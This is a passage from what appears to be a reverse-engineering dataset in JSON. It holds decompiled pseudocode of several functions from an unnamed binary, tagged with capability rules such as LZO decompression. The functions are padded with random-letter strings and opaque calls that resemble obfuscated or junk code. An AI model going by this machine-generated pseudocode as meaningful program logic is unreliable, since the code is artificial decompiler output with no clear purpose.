0x4505a0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00432ca0::var_18h;\n    var_74h = param_1 + 0x3c;\n    var_6ch = param_1;\n    var_20h = param_1;\n    fcn.004040a7();\n    var_70h = var_6ch + 0x54;\n    fcn.004040a7();\n    var_10h = 1;\n    var_7ch = &stack0xffffff08;\n    puStack252 = 0x432d1c;\n    fcn.00402374(0, 0x406d4000, 0x14a3);\n    var_78h = &stack0xfffffed4;\n    arg_8h = \"kmvxiyzdtmexoqxybxxvsdlfybbyjnwmcvxtgsitokttbwulrqhtphgyvabumpsiqwdkwivcqhbdjardzwefgnnlbmfhfvyuqhk\";\n    puStack252 = &stack0xffffff08;\n    fcn.00401e79(\"kmvxiyzdtmexoqxybxxvsdlfybbyjnwmcvxtgsitokttbwulrqhtphgyvabumpsiqwdkwivcqhbdjardzwefgnnlbmfhfvyuqhk\");\n    puVar2 = var_78h;\n    var_78h[1] = 0x40bfeb00;\n    *puVar2 = 0;\n    puVar2[2] = 0xd0e;\n    puVar2[4] = 0x40c1fa00;\n    puVar2[3] = 0;\n    puVar2[6] = 0x40b97e00;\n    puVar2[5] = 0;\n    fcn.0040231a(arg_8h);\n    puVar3 = var_7ch;\n    var_84h = var_7ch;\n    *(var_7ch + -4) = var_7ch;\n    var_80h = puVar3 + -0x3c;\n    *(puVar3 + -0x40) = \"aizetyyuixtsuwkgqyjtdfmjhylscaqdmxtpeovaxtmiappxgweblrr\";\n    *(puVar3 + -0x44) = 0x432db1;\n    fcn.00401e79(*(puVar3 + -0x40));\n    puVar1 = var_80h;\n    *var_80h = 1;\n    *(puVar1 + 0x1c) = 0xf85;\n    puVar1[0x20] = 0;\n    *(puVar1 + 0x24) = 0x1a8;\n    *(puVar1 + 0x28) = 0xa26;\n    puVar1[0x2c] = 1;\n    puVar1[0x30] = 1;\n    *(puVar1 + 0x38) = 0x40e9a060;\n    *(puVar1 + 0x34) = 0;\n    *(puVar3 + -0x44) = 0x432df3;\n    fcn.00405074(*(puVar3 + -0x40));\n    puVar3 = var_84h;\n    var_8ch = var_84h;\n    *(var_84h + -4) = var_84h;\n    var_88h = puVar3 + -0x20;\n    *(puVar3 + -0x24) = \"cynwjcktqgkgucuhkjamivymljavrlqqpyeftynhleststxuamzbfdszalq\";\n    *(puVar3 + -0x28) = 0x432e26;\n    fcn.00401e79(*(puVar3 + -0x24));\n    puVar1 = var_88h;\n    *(var_88h + 0x18) = 800;\n    *(puVar1 + 0x1c) = 0x9a2;\n    *(puVar3 + -0x28) = 0x432e47;\n    fcn.00401bea(*(puVar3 + -0x24));\n    puVar1 = var_8ch;\n    var_94h = var_8ch;\n    *(var_8ch + -4) = var_8ch;\n    var_90h = puVar1 + -0x38;\n    *(puVar1 + -0x3c) = \"zbqsgshnwmlbtwjzsgnputuckjqbnyxtxgitiwdzwljybeodjlkoplazkoxufnhlloaoyyrfbq\";\n    *(puVar1 + -0x40) = 0x432e78;\n    fcn.00401e79(*(puVar1 + -0x3c));\n    puVar2 = var_90h;\n    var_90h[1] = 0x40a93200;\n    *puVar2 = 0;\n    puVar2[3] = 0x40d15200;\n    puVar2[2] = 0;\n    puVar2[5] = 0x40ced500;\n    puVar2[4] = 0;\n    *(puVar2 + 6) = 1;\n    *(puVar2 + 0xd) = 0;\n    *(puVar1 + -0x40) = 0x432ebc;\n    fcn.00403382(*(puVar1 + -0x3c));\n    puVar1 = var_94h;\n    var_a0h = var_94h;\n    *(var_94h + -4) = var_94h;\n    var_9ch = puVar1 + -0x7c;\n    var_98h = puVar1 + -0x1c;\n    *(puVar1 + -0x80) = \"uouixtrbzvhbzrtbuhifbfrshginieuhpcqxhbjmmhxzvkvqryibhcbxetizpvghlyixzepqpyrujgewjexdzeydmbqdo\";\n    *(puVar1 + -0x84) = 0x432ef3;\n    fcn.00401e79(*(puVar1 + -0x80));\n    var_a4h = var_9ch + 0x11;\n    var_10h = 6;\n    *(puVar1 + -0x84) =\n         \"gaqjzvnqczgbogydxzuwjturttqwlbjzhgwgugclcyogmzihaehxwoylflogvhgyeosxigqdbkwdougphrnrrgoqkuudeew\";\n    *(puVar1 + -0x88) = 0x432f1e;\n    fcn.00401e79(*(puVar1 + -0x84));\n    var_a8h = var_9ch + 0xb;\n    var_10h = 7;\n    *(puVar1 + -0x88) = \"eklognzkfhkdjljbtngfflsuplidbffqakimgdgtodrfjlpdiqcfckiebbdrjdoxwcj\";\n    *(puVar1 + -0x8c) = 0x432f49;\n    fcn.00401e79(*(puVar1 + -0x88));\n    var_10h = 8;\n    *(puVar1 + -0x8c) = \"vxhafruyfqgftkgnwtousbwjcxxywfcaqd\";\n    *(puVar1 + -0x90) = 0x432f6e;\n    fcn.00401e79(*(puVar1 + -0x8c));\n    puVar2 = var_9ch;\n    var_9ch[1] = 0x40d5ae40;\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2[3] = 0x89a;\n    puVar2[4] = 0xb57;\n    puVar2[0x17] = 0x1104;\n    *(puVar2 + 0x1e) = 1;\n    var_10h = 1;\n    *(puVar1 + -0x90) = 0x432fb2;\n    fcn.004035c1(*(puVar1 + -0x8c));\n    puVar1 = var_a0h;\n    var_b4h = var_a0h;\n    *(var_a0h + -4) = var_a0h;\n    var_b0h = puVar1 + -0x4c;\n    var_ach = puVar1 + -0x1c;\n    *(puVar1 + -0x50) = \"dtzhflq\";\n    *(puVar1 + -0x54) = 0x432fee;\n    fcn.00401e79(*(puVar1 + -0x50));\n    var_10h = 5;\n    *(puVar1 + -0x54) = \"jwtfftenrnqywbwaiolngtwepmmnbabcqhnkbqgnkarhqpusvgesukrgrrzapyrulpambn\";\n    *(puVar1 + -0x58) = 0x433013;\n    fcn.00401e79(*(puVar1 + -0x54));\n    puVar2 = var_b0h;\n    *var_b0h = 0xa84;\n    *(puVar2 + 7) = 0;\n    puVar2[9] = 0x40d54640;\n    puVar2[8] = 0;\n    puVar2[10] = 0x67d;\n    puVar2[0xb] = 0x67f;\n    *(puVar2 + 0x12) = 1;\n    *(puVar1 + -0x58) = 0x433050;\n    fcn.00405277(*(puVar1 + -0x54));\n    puVar1 = var_b4h;\n    var_bch = var_b4h;\n    *(var_b4h + -4) = var_b4h;\n    var_b8h = puVar1 + -0x38;\n    var_10h = 1;\n    *(puVar1 + -0x3c) = \"ofaecnsxaotdztlgcrdlxssst\";\n    *(puVar1 + -0x40) = 0x43308a;\n    fcn.00401e79(*(puVar1 + -0x3c));\n    piVar4 = var_b8h;\n    *var_b8h = &fcn.00432ca0::var_38h;\n    piVar4[2] = 0x40cce580;\n    piVar4[1] = 0;\n    piVar4[3] = 0x147;\n    piVar4[4] = 0x781;\n    piVar4[5] = 0x1c76;\n    *(piVar4 + 6) = 1;\n    *(piVar4 + 7) = 1;\n    *(puVar1 + -0x40) = 0x4330cd;\n    fcn.00402914(*(puVar1 + -0x3c));\n    puVar1 = var_bch;\n    *(var_bch + -4) = 0x4330e2;\n    fcn.00403b02();\n    var_c8h = puVar1;\n    var_c4h = puVar1 + -0x74;\n    var_c0h = puVar1 + -0x18;\n    *(puVar1 + -0x78) = \"heodujzrmhskrdeoptxrzlydrfhjlolqxykqrtnaxcyttemerqhjyvjbqh\";\n    *(puVar1 + -0x7c) = 0x433110;\n    fcn.00401e79(*(puVar1 + -0x78));\n    var_cch = var_c4h + 0xe;\n    var_10h = 2;\n    *(puVar1 + -0x7c) = \"ykmdndjmlnrvang\";\n    *(puVar1 + -0x80) = 0x43313b;\n    fcn.00401e79(*(puVar1 + -0x7c));\n    var_d0h = var_c4h + 8;\n    var_10h = 3;\n    *(puVar1 + -0x80) = \"zghlitedefvepzzkosddrtlpmvslazknmihpgrysuewhyapkxyhbtmthhetxbfbppuucslgyyvfoosdkomzjtongpdxf\";\n    *(puVar1 + -0x84) = 0x433166;\n    fcn.00401e79(*(puVar1 + -0x80));\n    var_10h = 4;\n    *(puVar1 + -0x84) = \"qpafkztkbk\";\n    *(puVar1 + -0x88) = 0x43318b;\n    fcn.00401e79(*(puVar1 + -0x84));\n    piVar4 = var_c4h;\n    *var_c4h = &fcn.00432ca0::var_50h;\n    *(piVar4 + 7) = 1;\n    piVar4[0x14] = 0x16e;\n    piVar4[0x16] = 0x40b46e00;\n    piVar4[0x15] = 0;\n    var_10h = 1;\n    *(puVar1 + -0x88) = 0x4331c3;\n    fcn.004052ef(*(puVar1 + -0x84));\n    puVar3 = var_c8h;\n    *(var_c8h + -4) = 0x4331d8;\n    fcn.00403b02();\n    var_d8h = puVar3;\n    var_d4h = puVar3 + -0x20;\n    *(puVar3 + -0x24) = \"jwmigjltyvmtzvissihavguihdmhjvhauzdmkdlweenakdpzoxhlkvegietuxf\";\n    *(puVar3 + -0x28) = 0x433200;\n    fcn.00401e79(*(puVar3 + -0x24));\n    puVar1 = var_d4h;\n    *var_d4h = 1;\n    puVar1[4] = 1;\n    *(puVar3 + -0x28) = 0x43321a;\n    fcn.00404cc8(*(puVar3 + -0x24));\n    puVar1 = var_d8h;\n    puVar5 = var_d8h + -8;\n    puVar6 = var_d8h + -8;\n    var_e0h = var_d8h + -8;\n    *(var_d8h + -4) = 0;\n    *puVar5 = 0x13f;\n    *(puVar1 + -0xc) = 0x43323c;\n    fcn.0040111d(*puVar6, *(puVar1 + -4));\n    var_dch = puVar1 + -0x30;\n    *(puVar1 + -0x34) = \"bkmurgwynvelnehhadjjmzqusgxwofgrwqsjejsp\";\n    *(puVar1 + -0x38) = 0x433264;\n    fcn.00401e79(*(puVar1 + -0x34));\n    puVar2 = var_dch;\n    var_dch[1] = 0x40f016d0;\n    *puVar2 = 0;\n    puVar2[9] = 0x40eacbc0;\n    puVar2[8] = 0;\n    *(puVar1 + -0x38) = 0x433292;\n    fcn.00401feb(*(puVar1 + -0x34));\n    puVar1 = var_e0h;\n    var_e8h = var_e0h;\n    *(var_e0h + -4) = var_e0h;\n    var_e4h = puVar1 + -0x1c;\n    *(puVar1 + -0x20) =\n         \"fzcnsulfhzzxvpcogbpjahvcgitvjkykyeqzvmmljcsowavpbqkuwkkzelefxcglvqojhzahzcgirfutizyylpaicpefdangd\";\n    *(puVar1 + -0x24) = 0x4332c8;\n    fcn.00401e79(*(puVar1 + -0x20));\n    *var_e4h = &fcn.00432ca0::var_68h;\n    *(puVar1 + -0x24) = 0x4332e0;\n    fcn.004041d8(*(puVar1 + -0x20));\n    *(var_e8h + -4) = 0x4332f5;\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return var_6ch;\n}\n",
        "token_count": 4404
    },
    "00435180": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __fastcall fcn.00435180(int32_t param_1)\n\n{\n    uchar *puVar1;\n    uint *puVar2;\n    uchar *puVar3;\n    uint *puVar4;\n    int32_t *in_FS_OFFSET;\n    char *arg_8h;\n    uchar auStack272 [36];\n    uint uStack236;\n    uchar *var_d4h;\n    uint *var_d0h;\n    uint *var_cch;\n    uchar *var_c8h;\n    uint *var_c4h;\n    uchar *var_c0h;\n    uchar *var_bch;\n    uchar *var_b8h;\n    uchar *var_b4h;\n    uint *var_b0h;\n    uchar *var_ach;\n    uchar *var_a8h;\n    uint *var_a4h;\n    uchar *var_a0h;\n    uchar *var_9ch;\n    uchar *var_98h;\n    uint *var_94h;\n    uchar *var_90h;\n    uint *var_8ch;\n    uchar *var_88h;\n    uint *var_84h;\n    uint *var_80h;\n    uchar *var_7ch;\n    uint *var_78h;\n    uchar *var_74h;\n    uchar *var_70h;\n    uchar *var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    uint var_38h;\n    int32_t var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    var_1ch = &fcn.00435180::var_d4h;\n    var_10h = 0xffffffff;\n    var_14h = 0x450740;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00435180::var_18h;\n    var_68h = param_1 + 0x18;\n    var_54h = param_1;\n    var_20h = param_1;\n    fcn.004040a7();\n    var_64h = var_54h + 0x34;\n    fcn.004040a7();\n    var_60h = var_54h + 0x50;\n    fcn.004040a7();\n    var_5ch = var_54h + 0x68;\n    fcn.004040a7();\n    var_58h = var_54h + 0x84;\n    fcn.004040a7();\n    var_10h = 4;\n    var_70h = &stack0xffffff18;\n    uStack236 = 0x43522f;\n    fcn.00404a48(&fcn.00435180::var_38h, 0, 0x40f15470, 0x232);\n    uStack236 = 0x43523c;\n    fcn.00403b02();\n    var_6ch = &stack0xfffffef0;\n    arg_8h = \"iopxzvzxqwecyjukwntosiyuaxjlrspzwgabqxkbzojqzhxhwzjftijoyxwnnm\";\n    fcn.00401e79(\"iopxzvzxqwecyjukwntosiyuaxjlrspzwgabqxkbzojqzhxhwzjftijoyxwnnm\");\n    puVar1 = var_6ch;\n    *(var_6ch + 0x1c) = 0x40c1b400;\n    *(puVar1 + 0x18) = 0;\n    *(puVar1 + 0x20) = 0xa1b;\n    puVar1[0x24] = 0;\n    fcn.00406668(arg_8h);\n    puVar1 = var_70h;\n    var_7ch = var_70h;\n    *(var_70h + -4) = var_70h;\n    var_78h = puVar1 + -0x68;\n    var_74h = puVar1 + -0x18;\n    *(puVar1 + -0x6c) = \"lxvexlerkccxvzmepkytrkfwlnvac\";\n    *(puVar1 + -0x70) = 0x4352b4;\n    fcn.00401e79(*(puVar1 + -0x6c));\n    var_80h = var_78h + 0xe;\n    var_10h = 0xb;\n    *(puVar1 + -0x70) = \"ojskzctwrpmk\";\n    *(puVar1 + -0x74) = 0x4352d9;\n    fcn.00401e79(*(puVar1 + -0x70));\n    var_84h = var_78h + 8;\n    var_10h = 0xc;\n    *(puVar1 + -0x74) = \"zcsrbpnwrnezzfttnziafjsszptzxcxsnqtuhjgpvpftebmmemciywfhzcpb\";\n    *(puVar1 + -0x78) = 0x435301;\n    fcn.00401e79(*(puVar1 + -0x74));\n    var_10h = 0xd;\n    *(puVar1 + -0x78) =\n         \"pmdbncxodrfaveubzghmrayqthzddwumsiveryzcbxzmzsfocrzyacbrivrkjblwcnwbinyuxquwvhqjegcxzgsvrxomxspbgy\";\n    *(puVar1 + -0x7c) = 0x435323;\n    fcn.00401e79(*(puVar1 + -0x78));\n    puVar2 = var_78h;\n    *var_78h = 0xec0;\n    puVar2[1] = 0x5af;\n    var_10h = 4;\n    *(puVar1 + -0x7c) = 0x435347;\n    fcn.00405ed9(*(puVar1 + -0x78));\n    puVar1 = var_7ch;\n    var_90h = var_7ch;\n    *(var_7ch + -4) = var_7ch;\n    var_8ch = puVar1 + -0x6c;\n    var_88h = puVar1 + -0x18;\n    *(puVar1 + -0x70) = \"eoqyiffbmucmftszzlbbjviiutq\";\n    *(puVar1 + -0x74) = 0x435380;\n    fcn.00401e79(*(puVar1 + -0x70));\n    var_94h = var_8ch + 0xd;\n    var_10h = 9;\n    *(puVar1 + -0x74) = \"lmvlphqdnfdelchhvl\";\n    *(puVar1 + -0x78) = 0x4353ab;\n    fcn.00401e79(*(puVar1 + -0x74));\n    var_10h = 10;\n    *(puVar1 + -0x78) = \"ivxtqrxexuzodgrtjoekmdnwtordoqbktfeymyfjguiuckrxtqrzjygviijporujsjmjrycrhcioerylembmcrffnz\";\n    *(puVar1 + -0x7c) = 0x4353d0;\n    fcn.00401e79(*(puVar1 + -0x78));\n    puVar2 = var_8ch;\n    var_8ch[1] = 0x40f14660;\n    *puVar2 = 0;\n    puVar2[3] = 0x40c79900;\n    puVar2[2] = 0;\n    puVar2[4] = 0x33b;\n    puVar2[6] = 0x40d65700;\n    puVar2[5] = 0;\n    puVar2[0x14] = 0x40baec00;\n    puVar2[0x13] = 0;\n    var_10h = 4;\n    *(puVar1 + -0x7c) = 0x435428;\n    fcn.004031d9(*(puVar1 + -0x78));\n    puVar3 = var_90h;\n    var_a0h = var_90h;\n    *(var_90h + -4) = var_90h;\n    var_9ch = puVar3 + -0x48;\n    var_98h = puVar3 + -0x30;\n    *(puVar3 + -0x4c) = \"zdjkiapujehrmeigumfcosfcvymzsjxg\";\n    *(puVar3 + -0x50) = 0x435464;\n    fcn.00401e79(*(puVar3 + -0x4c));\n    var_10h = 8;\n    *(puVar3 + -0x50) = \"nyxtyowxywmdabsipfiikaebjeoeenmqqgdaeurnhvqscmkritrcinoct\";\n    *(puVar3 + -0x54) = 0x435486;\n    fcn.00401e79(*(puVar3 + -0x50));\n    puVar1 = var_9ch;\n    *(var_9ch + 0x30) = 0x19c2;\n    *(puVar1 + 0x38) = 0x40db0940;\n    *(puVar1 + 0x34) = 0;\n    *(puVar1 + 0x40) = 0x40917000;\n    *(puVar1 + 0x3c) = 0;\n    *(puVar1 + 0x44) = 0x399;\n    var_10h = 4;\n    *(puVar3 + -0x54) = 0x4354ca;\n    fcn.00405155(*(puVar3 + -0x50));\n    puVar1 = var_a0h;\n    var_a8h = var_a0h;\n    *(var_a0h + -4) = var_a0h;\n    var_a4h = puVar1 + -0x30;\n    *(puVar1 + -0x34) = \"dfmpojgjvkwavqpvxgzqshdjhpgjfmerakvphitkvqpyqcyrkmhgfmq\";\n    *(puVar1 + -0x38) = 0x435500;\n    fcn.00401e79(*(puVar1 + -0x34));\n    puVar2 = var_a4h;\n    var_a4h[1] = 0x40cbdb80;\n    *puVar2 = 0;\n    puVar2[9] = 0x40a0c000;\n    puVar2[8] = 0;\n    puVar2[10] = 0xde4;\n    *(puVar2 + 0xb) = 0;\n    *(puVar1 + -0x38) = 0x435539;\n    fcn.00402a40(*(puVar1 + -0x34));\n    puVar1 = var_a8h;\n    var_b4h = var_a8h;\n    *(var_a8h + -4) = var_a8h;\n    var_b0h = puVar1 + -0x34;\n    var_ach = puVar1 + -0x18;\n    *(puVar1 + -0x38) = \"yhecoujavxvnkqb\";\n    *(puVar1 + -0x3c) = 0x435575;\n    fcn.00401e79(*(puVar1 + -0x38));\n    var_10h = 7;\n    *(puVar1 + -0x3c) = \"kxtoqvv\";\n    *(puVar1 + -0x40) = 0x43559a;\n    fcn.00401e79(*(puVar1 + -0x3c));\n    *var_b0h = 0x67;\n    var_10h = 4;\n    *(puVar1 + -0x40) = 0x4355ba;\n    fcn.00402298(*(puVar1 + -0x3c));\n    puVar3 = var_b4h;\n    puVar4 = var_b4h + -0x14;\n    var_bch = var_b4h + -0x14;\n    *(var_b4h + -0x14) = &fcn.00435180::var_50h;\n    *(puVar3 + -8) = 0x40d63e40;\n    *(puVar3 + -0xc) = 0;\n    *(puVar3 + -4) = 0x14fd;\n    *(puVar3 + -0x10) = 0x4fc;\n    *(puVar3 + -0x18) = 0x4355f7;\n    fcn.004041d3(*puVar4, *(puVar3 + -0x10), *(puVar3 + -0xc), *(puVar3 + -8), *(puVar3 + -4));\n    *(puVar3 + -0x18) = 0x435604;\n    fcn.00403b02();\n    var_b8h = puVar3 + -0x40;\n    *(puVar3 + -0x44) = \"gqjmzwtkymbrvmgbxgoymtvkmvxszfywoxpijmwlzsfe\";\n    *(puVar3 + -0x48) = 0x43562c;\n    fcn.00401e79(*(puVar3 + -0x44));\n    puVar1 = var_b8h;\n    *var_b8h = 0;\n    *(puVar1 + 4) = 0xc37;\n    *(puVar1 + 0xc) = 0x40e6dd40;\n    *(puVar1 + 8) = 0;\n    *(puVar1 + 0x10) = 0x1a2a;\n    *(puVar3 + -0x48) = 0x43565e;\n    fcn.00404444(*(puVar3 + -0x44));\n    puVar1 = var_bch;\n    *(var_bch + -4) = 0x435673;\n    fcn.00401edd();\n    var_c8h = puVar1;\n    var_c4h = puVar1 + -0x68;\n    var_c0h = puVar1 + -0x24;\n    *(puVar1 + -0x6c) = \"gndypiazdonjqiukkhpuodqvymcfflssnzewfkxmaojrrmgokwmiqpggmvwluucci\";\n    *(puVar1 + -0x70) = 0x4356a1;\n    fcn.00401e79(*(puVar1 + -0x6c));\n    var_cch = var_c4h + 10;\n    var_10h = 5;\n    *(puVar1 + -0x70) = \"vlgb\";\n    *(puVar1 + -0x74) = 0x4356cc;\n    fcn.00401e79(*(puVar1 + -0x70));\n    var_10h = 6;\n    *(puVar1 + -0x74) = \"qfeytjmexgipwbnfykououlhluiimdfsdlchdqzb\";\n    *(puVar1 + -0x78) = 0x4356f1;\n    fcn.00401e79(*(puVar1 + -0x74));\n    puVar2 = var_c4h;\n    var_c4h[1] = 0x40b2ab00;\n    *puVar2 = 0;\n    *(puVar2 + 2) = 1;\n    *(puVar2 + 9) = 0;\n    *(puVar2 + 0x10) = 1;\n    puVar2[0x18] = 0x40ce3f00;\n    puVar2[0x17] = 0;\n    *(puVar2 + 0x19) = 0;\n    var_10h = 4;\n    *(puVar1 + -0x78) = 0x435736;\n    fcn.00405245(*(puVar1 + -0x74));\n    puVar1 = var_c8h;\n    *(var_c8h + -4) = 0x43574b;\n    fcn.00403ed1();\n    var_d4h = puVar1;\n    var_d0h = puVar1 + -0x1c;\n    *(puVar1 + -0x20) = \"uxdzrmgnqcgcwjaayq\";\n    *(puVar1 + -0x24) = 0x43577a;\n    fcn.00401e79(*(puVar1 + -0x20));\n    *var_d0h = 0x538;\n    *(puVar1 + -0x24) = 0x435793;\n    fcn.00405f29(*(puVar1 + -0x20));\n    *in_FS_OFFSET = var_18h;\n    return var_54h;\n}\n",
        "token_count": 3985
    },
    "004388b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint fcn.004388b0(void)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    uint *puVar7;\n    uint *puVar9;\n    uint *puVar11;\n    uint *puVar12;\n    uint *puVar14;\n    int32_t *in_FS_OFFSET;\n    char *arg_8h;\n    uchar auStack528 [128];\n    uchar auStack400 [20];\n    uint uStack380;\n    uchar *var_170h;\n    uchar *var_16ch;\n    uchar *var_168h;\n    uchar *var_164h;\n    uchar *var_160h;\n    uchar *var_15ch;\n    uchar *var_158h;\n    uint *var_154h;\n    uchar *var_150h;\n    uint *var_14ch;\n    uchar *var_148h;\n    uchar *var_144h;\n    uchar *var_140h;\n    uint *var_13ch;\n    uchar *var_138h;\n    uchar *var_134h;\n    uchar *var_130h;\n    uchar *var_12ch;\n    uchar *var_128h;\n    uchar *var_124h;\n    uchar *var_120h;\n    uchar *var_11ch;\n    uint *var_118h;\n    uchar *var_114h;\n    uchar *var_110h;\n    uchar *var_10ch;\n    uchar *var_108h;\n    uchar *var_104h;\n    uint *var_100h;\n    uchar *var_fch;\n    uchar *var_f8h;\n    uint *var_f4h;\n    uchar *var_f0h;\n    uchar *var_ech;\n    uchar *var_e8h;\n    uchar *var_e4h;\n    uchar *var_e0h;\n    uint *var_dch;\n    uchar *var_d8h;\n    uchar *var_d4h;\n    uchar *var_d0h;\n    uint *var_cch;\n    uchar *var_c8h;\n    uchar *var_c4h;\n    uchar *var_c0h;\n    uchar *var_bch;\n    uint *var_b8h;\n    uchar *var_b4h;\n    uchar *var_b0h;\n    uchar *var_ach;\n    int32_t *var_a8h;\n    uchar *var_a4h;\n    uchar *var_a0h;\n    uchar *var_9ch;\n    uint *var_98h;\n    uchar *var_94h;\n    uchar *var_90h;\n    uchar *var_8ch;\n    uchar *var_88h;\n    uchar *var_84h;\n    uint var_80h;\n    uchar *var_7ch;\n    uchar *var_78h;\n    uchar *var_74h;\n    uchar *var_70h;\n    uchar *var_6ch;\n    uint var_68h;\n    uint var_50h;\n    uint var_38h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *puVar6;\n    uint *puVar8;\n    uint *puVar10;\n    uint *puVar13;\n    \n    var_1ch = &fcn.004388b0::var_170h;\n    var_10h = 0xffffffff;\n    var_14h = 0x450980;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004388b0::var_18h;\n    var_7ch = &stack0xfffffe88;\n    uStack380 = 0x4388fb;\n    fcn.004037ec(0x2e9);\n    var_70h = &stack0xfffffdf0;\n    var_78h = &stack0xfffffdf0;\n    var_74h = &stack0xfffffe70;\n    fcn.00401e79(\"lymlodnkpwfcscegpypljxozokanjbykjidbpliwurovyufspiabpgynwbhpzfkpwmrciohbyjqblxwi\");\n    var_6ch = var_70h + 0x68;\n    var_10h = 0;\n    fcn.00401e79(\"nedzwmpaykrbg\");\n    var_84h = var_78h + 0x48;\n    var_10h = 1;\n    fcn.00401e79(\"dwbtowojuegmtwovrqzsbrbffdsoxqgsmmwhirtmygzkalztvrsnjvqiaciomahky\");\n    var_88h = var_78h + 0x28;\n    var_10h = 2;\n    fcn.00401e79(\"mxihnvsxpdevajfakuwzfhhthrdzxoufohqxirdlpfjvvzkpirkqtdvppfbxdiedatjaghircercilbnxqgwlflmekaqikpjmfj\");\n    var_10h = 3;\n    arg_8h = \"umfrrraffpujricsxwdchcjovwqwhbkitmkirvjsnvzdmvyauqrtapwpdylicbmmgtaktyzauyofdyxpfwqnxmzondgcqfjnlcsu\";\n    fcn.00401e79(\"umfrrraffpujricsxwdchcjovwqwhbkitmkirvjsnvzdmvyauqrtapwpdylicbmmgtaktyzauyofdyxpfwqnxmzondgcqfjnlcsu\")\n    ;\n    puVar1 = var_78h;\n    var_78h[0x18] = 1;\n    puVar1[0x1c] = 0;\n    *(puVar1 + 0x24) = 0x40d06540;\n    *(puVar1 + 0x20) = 0;\n    *(puVar1 + 0x44) = 0x40b4f300;\n    *(puVar1 + 0x40) = 0;\n    *(puVar1 + 100) = 0x40e21e40;\n    *(puVar1 + 0x60) = 0;\n    var_10h = 0xffffffff;\n    fcn.00404d27(arg_8h);\n    puVar1 = var_7ch;\n    var_9ch = var_7ch;\n    *(var_7ch + -4) = var_7ch;\n    var_90h = puVar1 + -0x60;\n    var_98h = puVar1 + -0x60;\n    var_94h = puVar1 + -0x20;\n    *(puVar1 + -100) = \"dkbpitdukyqwploazfq\";\n    *(puVar1 + -0x68) = 0x438a3c;\n    fcn.00401e79(*(puVar1 + -100));\n    var_8ch = var_90h + 0x28;\n    var_10h = 4;\n    *(puVar1 + -0x68) = \"imreqgj\";\n    *(puVar1 + -0x6c) = 0x438a62;\n    fcn.00401e79(*(puVar1 + -0x68));\n    var_10h = 5;\n    *(puVar1 + -0x6c) =\n         \"hhuokbgripbvkyxqjoazkffctwnvuhwmfdydxfsehwucrevdyffvyjigvvfickgdxsipufamxjclvoukfvsriizerkvcdtp\";\n    *(puVar1 + -0x70) = 0x438a87;\n    fcn.00401e79(*(puVar1 + -0x6c));\n    puVar3 = var_98h;\n    *var_98h = 0xbd6;\n    *(puVar3 + 1) = 1;\n    *(puVar3 + 2) = 0;\n    *(puVar3 + 9) = 1;\n    puVar3[0x17] = 0x40f063c0;\n    puVar3[0x16] = 0;\n    var_10h = 0xffffffff;\n    *(puVar1 + -0x70) = 0x438ac1;\n    fcn.00404511(*(puVar1 + -0x6c));\n    puVar1 = var_9ch;\n    var_b4h = var_9ch;\n    *(var_9ch + -4) = var_9ch;\n    var_b8h = puVar1 + -0x28;\n    *(puVar1 + -0x2c) = \"glojzqxbhhpdvgduqykbaqlhbdmxmllpziqfnpnurzorcynaazudcehkwdzdkrzpagfw\";\n    *(puVar1 + -0x30) = 0x438af0;\n    fcn.00401e79(*(puVar1 + -0x2c));\n    puVar3 = var_b8h;\n    *var_b8h = 0x469;\n    *(puVar3 + 7) = 1;\n    *(puVar3 + 8) = 0;\n    *(puVar3 + 9) = 1;\n    *(puVar1 + -0x30) = 0x438b10;\n    fcn.004049a3(*(puVar1 + -0x2c));\n    puVar1 = var_b4h;\n    var_b0h = var_b4h + -0x24;\n    puVar5 = var_b4h + -0x24;\n    puVar6 = var_b4h + -0x24;\n    var_ach = var_b4h + -0x24;\n    *(var_b4h + -0x10) = 0x40e1e020;\n    *(puVar1 + -0x14) = 0;\n    *(puVar1 + -0x18) = 0x40e29320;\n    *(puVar1 + -0x1c) = 0;\n    *(puVar1 + -4) = 0xf38;\n    *(puVar1 + -8) = 0xbc3;\n    *(puVar1 + -0xc) = 1;\n    *(puVar1 + -0x20) = 0;\n    *puVar5 = 0x71;\n    *(puVar1 + -0x28) = 0x438b69;\n    fcn.00401398(*puVar6, *(puVar1 + -0x20), *(puVar1 + -0x1c), *(puVar1 + -0x18), *(puVar1 + -0x14), *(puVar1 + -0x10)\n                 , *(puVar1 + -0xc), *(puVar1 + -8), *(puVar1 + -4));\n    var_a0h = puVar1 + -0x78;\n    var_a8h = puVar1 + -0x78;\n    var_a4h = puVar1 + -0x40;\n    *(puVar1 + -0x7c) = \"oayoxybgfeqoan\";\n    *(puVar1 + -0x80) = 0x438b9d;\n    fcn.00401e79(*(puVar1 + -0x7c));\n    var_10h = 6;\n    *(puVar1 + -0x80) = \"eirutubxuytfyjkfhagiqnvvwjrwmkmnbxmdwfscoinlcadimjvbapbqfzttqxofjwqmrhwpcaqfrdohrmumjfflnnpqlk\"\n    ;\n    *(puVar1 + -0x84) = 0x438bbd;\n    fcn.00401e79(*(puVar1 + -0x80));\n    piVar4 = var_a8h;\n    var_cch = &fcn.004388b0::var_38h;\n    *var_a8h = var_cch;\n    *(piVar4 + 1) = 1;\n    piVar4[2] = 0x632;\n    piVar4[4] = 0x40e36100;\n    piVar4[3] = 0;\n    piVar4[0xb] = 0x318;\n    piVar4[0xd] = 0x40ec3320;\n    